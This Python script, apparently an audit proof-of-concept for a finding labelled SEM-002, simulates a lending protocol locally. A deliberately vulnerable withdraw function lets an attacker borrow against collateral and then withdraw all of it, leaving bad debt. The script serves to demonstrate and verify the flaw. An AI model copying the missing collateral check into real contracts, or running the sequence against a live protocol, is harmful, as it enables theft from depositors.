"""Exploit PoC: Withdrawal allows full exit with outstanding borrows (SEM-002).

Demonstrates that a user can deposit collateral, borrow against it,
then withdraw ALL collateral â€” leaving the protocol with bad debt.
"""
from dataclasses import dataclass


@dataclass
class Pool:
    """Simulates the on-chain Pool account."""
    total_deposits: int = 0
    total_borrows: int = 0


@dataclass
class UserAccount:
    """Simulates the on-chain UserAccount."""
    deposited: int = 0
    borrowed: int = 0


def deposit(pool: Pool, user: UserAccount, amount: int) -> None:
    """Simulates the deposit instruction."""
    user.deposited += amount
    pool.total_deposits += amount
    print(f"  deposit({amount}) -> deposited={user.deposited}")


def borrow(pool: Pool, user: UserAccount, amount: int) -> bool:
    """Simulates the borrow instruction (with bug 1 present)."""
    if user.deposited >= amount:
        user.borrowed += amount
        pool.total_borrows += amount
        print(f"  borrow({amount}) -> APPROVED, total_debt={user.borrowed}")
        return True
    return False


def withdraw_vulnerable(pool: Pool, user: UserAccount, amount: int) -> bool:
    """Simulates the VULNERABLE withdraw instruction.

    BUG: Only checks deposited >= amount, does NOT verify remaining
    collateral covers outstanding borrows.
    """
    if user.deposited >= amount:
        user.deposited -= amount
        pool.total_deposits -= amount
        print(f"  withdraw({amount}) -> APPROVED (deposited was {user.deposited + amount} >= {amount})")
        print(f"    remaining deposits: {user.deposited}, outstanding debt: {user.borrowed}")
        return True
    else:
        print(f"  withdraw({amount}) -> REJECTED")
        return False


def main():
    print("=" * 60)
    print("EXPLOIT: Withdrawal With Outstanding Borrows")
    print("=" * 60)

    pool = Pool(total_deposits=1000)  # Pre-existing deposits
    attacker = UserAccount()
    attacker_wallet = 100  # Attacker starts with 100 SOL

    # Step 1: Deposit 100 SOL
    print("\nStep 1: Attacker deposits 100 SOL as collateral")
    deposit(pool, attacker, 100)
    attacker_wallet -= 100
    print(f"  Wallet balance: {attacker_wallet} SOL")

    # Step 2: Borrow 90 SOL
    print("\nStep 2: Borrow 90 SOL against collateral")
    assert borrow(pool, attacker, 90)
    attacker_wallet += 90
    print(f"  Wallet balance: {attacker_wallet} SOL")

    # Step 3: Withdraw ALL 100 SOL (this should fail but doesn't)
    print("\nStep 3: Withdraw 100 SOL (BUG: ignores outstanding 90 SOL debt)")
    assert withdraw_vulnerable(pool, attacker, 100), "Withdraw should pass due to bug"
    attacker_wallet += 100
    print(f"  Wallet balance: {attacker_wallet} SOL")

    # Verify exploit succeeded
    print("\n" + "=" * 60)
    print("EXPLOIT RESULT:")
    print(f"  Attacker started with:  100 SOL")
    print(f"  Attacker now has:       {attacker_wallet} SOL")
    print(f"  Attacker profit:        {attacker_wallet - 100} SOL (pure theft)")
    print(f"  Protocol bad debt:      {attacker.borrowed} SOL (unrecoverable)")
    print(f"  Attacker collateral:    {attacker.deposited} SOL (withdrawn everything)")

    assert attacker_wallet > 100, f"Attacker profited: {attacker_wallet} > 100"
    assert attacker.deposited == 0, "Attacker withdrew all collateral"
    assert attacker.borrowed == 90, "Debt still exists but is unrecoverable"
    print("\n  >>> EXPLOIT CONFIRMED: Full exit with outstanding borrows <<<")
    print("=" * 60)


if __name__ == "__main__":
    main()
